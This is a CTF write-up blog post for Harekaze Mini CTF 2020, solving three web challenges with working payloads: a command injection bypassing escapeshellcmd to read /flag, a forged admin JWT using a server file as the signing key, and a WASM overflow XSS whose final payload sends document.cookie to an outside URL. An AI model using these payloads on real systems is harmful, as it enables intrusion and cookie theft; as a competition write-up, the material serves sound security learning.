---
layout: post
title: "Harekaze Mini CTF 2020 writeup"
date: 2019-08-12 15:00
categories: CTF 
---

1st placed at NekoLover(@shpik)

I attended to Harekaze Mini CTF 2020 with `JJY`, `rbtree`, `03sunf`, and we god a first place :). 
I wrote writeup on some of the challs I solved.

It was a really fun CTF after a long time ago.

## [Web] What time is it now?
### Description
It's about ...

### Solve
Here is source code:
```php
<?php
if (isset($_GET['source'])) {
  highlight_file(__FILE__);
  exit;
}

$format = isset($_REQUEST['format']) ? (string)$_REQUEST['format'] : '%H:%M:%S';
$result = shell_exec("date '+" . escapeshellcmd($format) . "' 2>&1");
?>
```

As you can see, this chall is command injection.
Basically, If `escapeshellcmd` is a pair of `'` or `"`, it is not escape.

https://www.php.net/manual/en/function.escapeshellcmd.php
> Following characters are preceded by a backslash: &#;`|*?~<>^()[]{}$\, \x0A and \xFF. ' and " are escaped only if they are not paired.

Payload: ' '-f/flag

FLAG: HarekazeCTF{1t's_7pm_1n_t0ky0}

## [Web] JWT is secure
### Description
I learned implementing a custom session function is prone to be insecure, so this time I adopted JWT (JSON Web Token).

### Solve
First, i checked how to get flag, and found below code in `page/admin.php`:
```php
<?php if ($session->get('role') === 'admin') { ?>
    We have confirmed you are an admin. The flag is: <b><?= FLAG ?></b>.
<?php } else { ?>
    You have no authority to access this page!
<?php } ?>
```
If i have session with admin role, can get flag.

Therefore i noticed session manage class and found vulnerability.
```php
  public function __construct($cookie_name='jwtsession', $dir='./keys') {
    $this->cookie_name = $cookie_name;
    $this->base_dir = $dir;

    if (array_key_exists($cookie_name, $_COOKIE)) {
      try {
        $tmp = new JWT($_COOKIE[$cookie_name]);
        $kid = $tmp->getHeader('kid'); // 1. set kid value
        $this->key = $this->getSecretKey($kid); 

        if (!$tmp->verify($this->key)) {
          throw new Exception('Signature verification failed');
        }

        $this->jwt = $tmp;
      } catch (Exception $e) {
        die('Error occurred: ' . $e->getMessage());
      }
    }
    // ... snip ...
  }

  private function getSecretKey($kid) {
    $dir = $this->base_dir . '/' . $kid[0] . '/' . $kid[1];
    $path = $dir . '/' . $kid;

    // no path traversal, no stream wrapper
    if (preg_match('/\.\.|\/\/|:/', $kid)) {
      throw new Exception('Hacking attempt detected');
    }

    if (!file_exists($path) || !is_file($path)) {
      throw new Exception('Secret key not found');
    }

    return file_get_contents($path); // 2. open kid value if passed some check logic.
  }
```
The kid value in JWT is setted as key.
And it has some filtering.
Due to insufficient filtering, we can bypass it.

See the dist files, we know .htaccess file in keys directory.
So i use that files, and get flag with admin role session i made.

```python
import jwt

key = open("keys/.htaccess").read()
print(jwt.encode({"username": "1","role":"admin"},key, algorithm="HS256", headers={"typ":"JWT","kid":"./.htaccess"}))
```

FLAG: HarekazeCTF{l1st3n_1_just_g1v3_y0u_my_fl4g_4t4sh1_n0_w4v3_w0_t0b4sh1t3_m1ruk4r4}

## [Web] WASM BF
### Description
Now it is the era of WebAssembly. To learn WebAssembly, I wrote a Brainf*ck interpreter in C and compiled to wasm.

### Solve
It's a WASM chall, but fortunately the source code was given! :happy:

How to work:
1. Input Brainfuck(bf) code (Web)
2. execute bf code inputed (WASM)
    - Filtering: if char has `<` or `>` values, then it changes to HTML Entity (WASM)
3. Print in web page (WASM -> Web)


Here is filtering code:
```c
void print_char(char c) {
  if (buffer_pointer + 4 >= buffer + BUFFER_SIZE) {
    flush();
  }

  // Prevent XSS!
  if (c == '<' || c == '>') {
    buffer_pointer[0] = '&';
    buffer_pointer[1] = c == '<' ? 'l' : 'g';
    buffer_pointer[2] = 't';
    buffer_pointer[3] = ';';
    buffer_pointer += 4;
  } else {
    *buffer_pointer = c;
    buffer_pointer++;
  }
}
```

I focused on the code below and confirmed that there was no inspection of the boundary.

This allows access to `buffer` from `memory`, which can cause XSS by bypassing the filtering above.
```cpp
unsigned char buffer[BUFFER_SIZE] = {0};
unsigned char *buffer_pointer = buffer;
unsigned char memory[MEMORY_SIZE] = {0};
char program[PROGRAM_MAX_SIZE] = {0};

int execute(int length) {
  for (int i = 0; i < length; i++) {
    program[i] = _get_char();
  }
  // ...snip...
  while (counter < length && executed < 100000) {
    char c = program[counter];

    switch (c) {
      // ...snip...
      case '>': {
        pointer++;
        break;
      }
      case '<': {
        pointer--;
        break;
      }
      // ...snip...
    }
    // ...snip...
  }
  // ...snip...
}
```
Finally, i found index for overwritting `buffer` and got flag.

```javascript
executeButton.addEventListener('click', async () => {
    //execute(edit.value);
    for(var i=10;i<0x200;i++){
      rr= "----[---->+<]>--.--[--->+<]>.++++.------.-[--->+<]>--.---[->++++<]>-.-.++++[->+++<]>+.[--->++<]>-----.-[->++<]>.[---->+<]>++.+++++[->+++<]>.-.---------.+++++++++++++..---.+++.[-->+<]>++++.>--[----->+<]>-.[--->+<]>-.[->+++<]>-.+++++++++++.[--->+<]>++++.----[->+++<]>.+++.------------.--.--[--->+<]>-.-----------.++++++.-.[----->++<]>++.[--->++<]>-.++++[->+++<]>.----.--[--->+<]>---.++++[->+++<]>+.+++++.---[->+++<]>-.[--->++<]>-.++.+[->+++<]>.[--->+<]>---.+.--.[--->+<]>++.+++++++++.--------..-[-->+++<]>+."
      t = rr + "<".repeat(i) + ".";
      if(t.length > 1000) break;
      ee = await execute(t);
      if(ee.substr(-1) == "="){
        console.log(i, t, ee );
        break;
      }
    
    }
  }, false);
```

Here is my final payload:
```
?location.href=`https://[url]/?${document.cookie}`#----[---->+<]>--.--[--->+<]>.++++.------.-[--->+<]>--.---[->++++<]>-.-.++++[->+++<]>+.[--->++<]>-----.-[->++<]>.[---->+<]>++.+++++[->+++<]>.-.---------.+++++++++++++..---.+++.[-->+<]>++++.>--[----->+<]>-.[--->+<]>-.[->+++<]>-.+++++++++++.[--->+<]>++++.----[->+++<]>.+++.------------.--.--[--->+<]>-.-----------.++++++.-.[----->++<]>++.[--->++<]>-.++++[->+++<]>.----.--[--->+<]>---.++++[->+++<]>+.+++++.---[->+++<]>-.[--->++<]>-.++.+[->+++<]>.[--->+<]>---.+.--.[--->+<]>++.+++++++++.--------..-[-->+++<]>+.<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<-
```

FLAG: HarekazeCTF{I_th1nk_w4sm_1s_e4s1er_t0_re4d_th4n_4smjs}
